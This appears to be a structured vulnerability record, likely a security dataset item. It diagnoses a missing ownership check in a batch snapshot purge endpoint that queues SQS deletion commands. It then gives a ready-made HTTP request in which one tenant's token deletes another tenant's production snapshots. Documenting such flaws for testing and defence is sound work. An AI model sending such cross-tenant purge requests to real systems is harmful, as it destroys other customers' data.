diagnosis: The batch snapshot purge endpoint accepts an array of snapshotIds and publishes deletion commands to an AWS SQS queue via SendMessageBatchCommand without checking if the client owns the snapshots. An attacker can enqueue destruction tasks for cloud storage snapshots belonging to other platform tenants.
exploit_request:
POST /api/storage/backups/batch-purge HTTP/1.1
Host: storage.cloud.internal:3002
Authorization: Bearer <tenant_b_jwt>
Content-Type: application/json

{
  "snapshotIds": ["snap_prod_tenant_a_001", "snap_prod_tenant_a_002"]
}
